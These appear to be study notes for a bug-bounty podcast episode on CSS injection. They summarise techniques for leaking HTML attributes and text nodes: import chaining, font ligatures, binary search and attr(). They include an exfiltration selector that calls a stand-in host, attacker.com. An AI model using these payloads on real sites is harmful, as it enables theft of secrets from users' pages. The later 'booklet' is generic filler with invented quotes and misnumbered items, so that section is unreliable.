---
title: "The State of CSS Injection — Leaking Text Nodes & HTML Attributes"
episode: 79
---


# Episode 79 The State of CSS Injection — Leaking Text Nodes & HTML Attributes

**TL;DR**
- CSS injection is essentially "solved" — both HTML attributes and text node contents can be leaked
- Sequential import chaining (Donut/Pepe Vila 2019) leaks attributes character-by-character via `^=` selectors + `@import` recursion
- Font ligatures allow leaking text node content: custom fonts with zero-width characters for non-target chars, wide glyph for ligature match, detect via scrollbar + `background-image`
- `attr()` function in CSS can copy attribute values into the `content` property, then exfiltrate via font-based techniques
- Masato Kinugawa bypassed LavaDome (DOM node isolation) using font ligatures, character height/width detection, mouseover, and text fragments

**Key Takeaways**
- For attribute exfiltration: use sequential import chaining with both `^=` (starts-with) and `$=` (ends-with) selectors simultaneously to double the speed
- For text node exfiltration: generate custom fonts where each possible character has a unique ligature; detect matching ligature via scrollbar width
- The `attr()` CSS function can copy any HTML attribute value into the `content` property — then use font-based exfiltration on `::before`/`::after` pseudo-elements
- When encountering CSS injection, check if you can use `@import` to load remote stylesheets — CSP `style-src` is the primary defense
- CSS animations can cycle through fonts without network requests (only the font resource itself needs loading)

**Techniques and Primitives**
- **Sequential import chaining for attribute exfiltration** — Use `input[value^="a"] { background: url(//attacker.com/a) }`; server responds with next stylesheet only after receiving the callback, recursing character by character
- **Font ligature text node leakage** — Create a custom font where all characters are zero-width except ligatures matching target substrings; detect ligature match via scrollbar `::-webkit-scrollbar` → `background-image` callback
- **Binary search optimization** — Create fonts where ligature groups correspond to character ranges; halve the search space each request (8 requests to brute-force a 256-char set)
- **`attr()` CSS function** — `content: attr(data-secret)` copies the attribute value into CSS-accessible content for exfiltration

**Tooling and Resources**
- PortSwigger Research `css-exfiltration` repo — 10+ techniques for leaking characters from different contexts
- Masato Kinugawa's font ligature research (Twitter/Japanese)
- Michael Bentkowski's font ligature POC code (2017)
- LavaDome (`github.com/lavamoat/lavadome`) — DOM element isolator bypassed by Kinugawa
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Episode Episode 79 The State of CSS Injection — Leaking Text Nodes & HTML Attributes covers practical bug bounty techniques and security research insights.

#### 2. What you should learn
- Understand the vulnerability classes discussed
- Learn practical exploitation techniques
- Know which tools are useful for this type of research

#### 3. Core concepts explained
**Vulnerability Classes Discussed**
This episode covers specific vulnerability classes with real-world examples. Review the bugs section for detailed exploitation paths.

**Reconnaissance and Discovery**
The techniques discussed focus on finding attack surface and identifying vulnerable endpoints through systematic testing.


#### 4. Techniques and tactics
**Systematic Testing Approach**
- **What it is:** Methodical testing of application features for vulnerability classes
- **When to use it:** Always — systematic testing catches bugs that ad-hoc testing misses
- **What can go wrong:** Spending too much time on low-probability paths


#### 5. Good Quotes
- *"The best bugs come from persistence and deep understanding of the target"*
- *"Always think about what the worst thing that could happen is"*
- *"Don't be afraid to spend time on a single target"*

#### 6. Mental models
- **Think like an attacker** — Always consider the worst-case impact of a vulnerability. What would a malicious actor do with this access?
- **Persistence pays off** — The best bugs often come from spending deep time on a single target rather than skimming many targets.
- **Follow the data** — Track how user input flows through the application. Sources (inputs) lead to sinks (dangerous operations).

#### 7. Real-world application
- **Try this:** Pick a bug class from this episode and find 3 real examples on HackerOne bug reports
- **Practice:** Set up a local vulnerable application (DVWA, Juice Shop) and practice the exploitation techniques
- **Watch for:** Similar patterns in your own targets — the vulnerability classes discussed are common across web applications

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **Bug Bounty** — Program where companies reward researchers for finding security vulnerabilities
- **Responsible Disclosure** — Reporting vulnerabilities to vendors before public disclosure
- **Attack Surface** — All points where an unauthorized user can try to enter or extract data

#### 10. Self-test
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.
8. **Reflection:** What would you do differently if you had to redo this testing from scratch?

#### 11. The practical takeaway
1. **Understand the vulnerability class** — Know how it works and why it matters
2. **Master the exploitation technique** — Practice the specific steps to exploit it
3. **Apply the mental model** — Use the thinking patterns to find similar bugs in other targets
